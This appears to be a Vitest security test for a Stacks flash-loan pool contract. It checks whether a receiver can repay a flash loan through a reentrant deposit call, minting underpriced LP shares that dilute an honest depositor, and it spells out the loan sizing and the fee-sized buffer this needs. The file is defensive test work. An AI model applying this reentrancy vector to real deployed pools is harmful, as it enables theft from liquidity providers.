import { describe, expect, it, beforeEach } from "vitest";
import { Cl } from "@stacks/transactions";

/**
 * Hypothesis (ajv.1.5 threat model, reentrancy row): flashstack-stx-pool-v2 has
 * no reentrancy lock (unlike flashstack-pool-v3's per-asset lock, pv3-F1). Its
 * own doc comment claims "Reentrancy-safe: reserve checked after callback
 * returns" -- true against a receiver that simply keeps the funds, but that
 * claim says nothing about a receiver that repays via `deposit` instead of a
 * plain transfer. `deposit` is a public function like any other; nothing stops
 * flash-loan's receiver callback from calling it before the balance check runs.
 *
 * If that satisfies the repayment check AND mints LP shares, it mints them
 * against the pool's balance as depressed by this same loan's outbound
 * transfer (reserve-before minus amount), not the pool's real pre-loan balance
 * -- a cheaper share price than any honest depositor could get, diluting
 * existing LPs. This test proves or disproves that the vector is real, with a
 * receiver funded only with fee-sized capital (not the loan amount itself).
 */

const POOL = "flashstack-stx-pool-v2";
const RX = "test-pool-v2-receiver-deposit-reentrant";

const LP_DEP = 100_000_000; // 100 STX, the only honest LP
const LOAN_AMOUNT = 99_000_000; // 99 STX -- nearly all of the reserve
// Attacker's own capital: must cover the loan's fee (0.05% of LOAN_AMOUNT =
// 49,500 microSTX) so the receiver's own balance (loan + buffer) is enough
// to self-deposit amount+fee. Anything less and the `as-contract` deposit
// fails with ERR-REPAY-FAILED (insufficient balance) instead of succeeding
// cheaply -- there is no way around fronting at least the real fee.
const RX_BUFFER = 50_000;

describe("flashstack-stx-pool-v2: reentrant deposit-as-repayment", () => {
  let deployer: string, attacker: string, honestLp: string, rxPrincipal: string;

  const shares = (who: string) =>
    Number(simnet.callReadOnlyFn(POOL, "get-shares", [Cl.principal(who)], deployer).result.value);
  const stxValue = (who: string) =>
    Number(simnet.callReadOnlyFn(POOL, "get-stx-value", [Cl.principal(who)], deployer).result.value);
  const stxBalance = (who: string) => BigInt(simnet.getAssetsMap().get("STX")!.get(who) ?? 0);

  beforeEach(() => {
    deployer = simnet.getAccounts().get("deployer")!;
    attacker = simnet.getAccounts().get("wallet_1")!;
    honestLp = simnet.getAccounts().get("wallet_2")!;
    rxPrincipal = `${deployer}.${RX}`;

    simnet.callPublicFn(POOL, "deposit", [Cl.uint(LP_DEP)], honestLp);
    simnet.callPublicFn(POOL, "add-approved-receiver", [Cl.principal(rxPrincipal)], deployer);
    simnet.transferSTX(RX_BUFFER, rxPrincipal, attacker);
  });

  it("the loan succeeds by depositing instead of repaying directly", () => {
    const result = simnet.callPublicFn(
      POOL, "flash-loan", [Cl.uint(LOAN_AMOUNT), Cl.contractPrincipal(deployer, RX)], attacker,
    ).result;
    expect(result).toBeOk(Cl.bool(true));
  });

  it("the receiver contract ends up owning a share of the pool, funded by the loan itself -- not the attacker's wallet", () => {
    const attackerBalanceBefore = stxBalance(attacker);

    simnet.callPublicFn(
      POOL, "flash-loan", [Cl.uint(LOAN_AMOUNT), Cl.contractPrincipal(deployer, RX)], attacker,
    );

    const attackerBalanceAfter = stxBalance(attacker);
    const attackerOwnCapitalSpent = attackerBalanceBefore - attackerBalanceAfter;

    const rxShares = shares(rxPrincipal);
    const rxValue = stxValue(rxPrincipal);
    const attackerShares = shares(attacker);
    const honestLpValue = stxValue(honestLp);

    // With `as-contract`, the minted shares land on the receiver CONTRACT
    // (funded out of the loan it already holds), not the attacker's EOA.
    // The attacker's entire out-of-pocket cost for the whole attack is the
    // fee-sized RX_BUFFER pre-funded into the receiver in beforeEach -- the
    // flash-loan call itself costs the attacker nothing further.
    expect(attackerShares).toBe(0);
    expect(rxShares).toBeGreaterThan(0);
    expect(attackerOwnCapitalSpent).toBe(0n);
    expect(rxValue).toBeGreaterThan(RX_BUFFER);
    expect(honestLpValue).toBeLessThan(LP_DEP);
  });
});
